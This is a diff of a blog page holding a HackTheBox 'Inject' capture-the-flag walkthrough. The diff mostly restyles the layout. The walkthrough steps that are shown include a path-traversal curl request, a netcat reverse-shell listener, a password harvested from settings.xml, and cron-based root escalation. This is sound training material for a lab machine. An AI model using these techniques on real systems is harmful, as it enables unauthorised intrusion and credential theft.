@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inject - HTB</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
-    <link href="/css/writeups.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
@@ -18,50 +17,79 @@
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
-            <aside class="sidebar">
+            <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="Logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
                 </div>
                 <nav>
-                    <ul class="nav flex-column">
-                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
-                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
-                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
-                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
-                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
-                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
                     </ul>
                 </nav>
             </aside>
+
             <!-- Main Content -->
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/easy/inject/img/inject.png">
-                <h2>Inject - HTB</h2>
-                <p>walkthrough by elswix<p>
-                <ul class="machine-links" style="display: none">
-                    <li><a href="https://app.hackthebox.com/machines/Inject">HackTheBox</a></li>
-                </ul>
-            </section>
+                    <img src="/writeups/htb/easy/inject/img/inject.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Inject - HTB</h2>
+                    <p>walkthrough by elswixHackTheBox</p>
+                </section>
+
                 <section class="article-content">
-                    <div class="article-container">
-                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Inject</span>
+<div class="article-container">
+<div class="article-content-main"> <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Inject</span>
 <span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
 <span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
 <span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">3</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Inject HTB:</h3><br/>
 This is an easy-level machine in which we exploit a file upload vulnerability to make the page show us how we can access them. The page utilizes a parameter in the GET method to access system files, allowing us to exploit an LFI (Local File Inclusion) using the Directory Path Traversal technique.<br/><br/>
-<h3><br>Shell as Frank</br></h3><br>
-After performing a brief enumeration in the directory where the web service is hosted, we detected the presence of the Spring Boot framework. We leveraged a vulnerability in this framework that allows us to achieve remote code execution. This way, we gained access to the system as the user "frank".<br/><br/>
-<h3><br>Shell as Phil</br></h3><br>
-Subsequently, we proceeded to enumerate the personal directory of the user "phil" and successfully accessed a file that contained stored credentials. We utilized these credentials to log in as "phil".<br/><br/>
-<h3><br>Shell as Root</br></h3><br>
-To escalate our privileges to "root", we exploited a cron job by abusing YML extension files and utilized the "ansible-parallel" tool, which is executed at regular intervals.<br/><br/>
-<h3><br>Recon:</br></h3><br>
-Port Scanning:<br/><br/>
+<h3><br/>Shell as Frank</h3><br/>
+After performing a brief enumeration in the directory where the web service is hosted, we detected the presence of the Spring Boot framework. We leveraged a vulnerability in this framework that allows us to achieve remote code execution. This way, we gained access to the system as the user "frank".<br><br/>
+<h3><br/>Shell as Phil</h3><br/>
+Subsequently, we proceeded to enumerate the personal directory of the user "phil" and successfully accessed a file that contained stored credentials. We utilized these credentials to log in as "phil".<br><br/>
+<h3><br/>Shell as Root</h3><br/>
+To escalate our privileges to "root", we exploited a cron job by abusing YML extension files and utilized the "ansible-parallel" tool, which is executed at regular intervals.<br><br/>
+<h3><br/>Recon:</h3><br/>
+Port Scanning:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.129.35.222</span> <span class="o">-</span><span class="n">oG</span> <span class="n">tcpPorts</span>
 
 
@@ -91,9 +119,9 @@ Comprehensive scanning of technologies and services running on ports 22 and 8080
 </pre></div>
 
 Currently, since we don't have any credentials, we should avoid excessive use of the SSH service on port 22. Instead, we should focus on enumerating and investigating port 8080, which seems to correspond to a web service. This will allow us to gather information and conduct further analysis on the web application running on that port.<br/><br/>
-<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/1.png?raw=true"/><br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/1.png?raw=true"><br/><br/>
 After reviewing the technologies used by the web service using the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension in our browser, we did not come across any relevant or interesting information.<br/><br/>
-<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/2.png?raw=true"/><br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/2.png?raw=true"><br/><br/>
 We can observe that the page contains a YouTube video player displaying the following video:<br/><br/>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/3.png?raw=true"/><br/><br/>
 However, this is not particularly relevant, so to speak.<br/><br/>
@@ -162,8 +190,8 @@ Nevertheless, all hope is not lost. We can attempt the same request using the <c
 </pre></div>
 
 That worked. We have successfully triggered an LFI. Now, we can view files that we should not have access to through the victim machine's website, leveraging this vulnerability.<br/><br/>
-<h3><br>Shell as Frank</br></h3><br>
-After enumerating the system further, we discovered that it utilizes the Spring Framework.<br/><br/>
+<h3><br/>Shell as Frank</h3><br/>
+After enumerating the system further, we discovered that it utilizes the Spring Framework.<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://10.129.35.222:8080/show_image?img=../../../pom.xml'</span>
 
 <span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="err">?</span><span class="o">&gt;</span>
@@ -267,8 +295,8 @@ Before executing the file, we need to make sure we are listening on port 443 usi
 <div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">443</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/15.png?raw=true"/><br/><br/>
-<h3><br>Shell as Phil</br></h3><br>
-Upon inspecting the personal directory of the user "Frank," we did not find the user flag. However, we did notice a directory named ".m2." Upon entering this directory, we discovered the "settings.xml" file, which contains credentials.<br/><br/>
+<h3><br/>Shell as Phil</h3><br/>
+Upon inspecting the personal directory of the user "Frank," we did not find the user flag. However, we did notice a directory named ".m2." Upon entering this directory, we discovered the "settings.xml" file, which contains credentials.<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">frank@inject</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">frank</span><span class="o">/.</span><span class="n">m2</span><span class="o">/</span><span class="n">settings</span><span class="o">.</span><span class="n">xml</span>
 <span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="err">?</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">settings</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
@@ -292,8 +320,8 @@ We attempted to use these credentials to perform a migration to the user "Phil" 
 <span class="n">Password</span><span class="p">:</span> <span class="n">DocPhillovestoInject123</span>
 <span class="nd">phil@inject</span><span class="err">$</span>
 </pre></div>
-<h3><br>Shell as Root</br></h3><br>
-To escalate our privileges, the first step is to check if we have sudoers privileges. However, we did not find any relevant configurations in that regard. Nonetheless, we noticed that as the user "Phil," we belong to the "staff" group and have the ability to modify the contents of the "/opt/automation/tasks" directory.<br/><br/>
+<h3><br/>Shell as Root</h3><br/>
+To escalate our privileges, the first step is to check if we have sudoers privileges. However, we did not find any relevant configurations in that regard. Nonetheless, we noticed that as the user "Phil," we belong to the "staff" group and have the ability to modify the contents of the "/opt/automation/tasks" directory.<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">phil@inject</span><span class="err">$</span> <span class="nb">id</span> 
 <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">),</span><span class="mi">50</span><span class="p">(</span><span class="n">staff</span><span class="p">)</span>
 </pre></div>
@@ -361,15 +389,17 @@ Now, all that's left is to execute the command <code>bash -p</code> to obtain a 
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
 <span class="n">b1e</span><span class="o">**************************</span><span class="mi">205</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span>
-</pre></div></br></br></br></br></br></br></br>
-            </div>
+</pre></div></br></br></br></img></img></br></br></br></br>
+</div>
+</div>
+</section>
+<script src="/js/sidebarToggle.js"></script>
+<script src="/js/fixMobileImages.js"></script>
+<footer>
+<p>© 2024 elswix.github.io</p>
+</footer>
+            </main>
         </div>
-    </section>
-
-    <script src="/js/sidebarToggle.js"></script>
-    <script src="/js/fixMobileImages.js"></script>
-    <footer>
-        <p>&copy; 2024 elswix.github.io</p>
-    </footer>
+    </div>
 </body>
 </html>
